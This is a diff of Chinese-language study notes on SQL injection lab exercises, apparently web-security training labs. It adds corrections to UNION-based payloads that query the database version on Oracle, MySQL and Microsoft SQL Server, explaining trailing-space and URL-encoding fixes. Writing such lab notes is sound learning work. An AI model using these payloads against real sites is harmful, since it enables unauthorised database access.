@@ -72,11 +72,15 @@ payload：`/filter?category=' union select null,banner from v$version--`
 
 #### 6. SQL injection attack, querying the database type and version on MySQL and Microsoft
 
-这道题不知道是啥问题，一直不行，状态码一直是500。后面来做吧。
+这道题不知道是啥问题，一直不行，状态码一直是500。
 
 我觉得payload大概率就是：`' union select null,@@version--`
 
 官方的payload：`'+UNION+SELECT+@@version,+NULL#`
+
+这里，我的payload那个`--`后面需要一个空格。`' union select null,@@version--+`
+
+官方的payload的`#`需要url编码。`'+UNION+SELECT+@@version,+NULL%23`
 
 #### 7. SQL injection attack, listing the database contents on non-Oracle databases
 
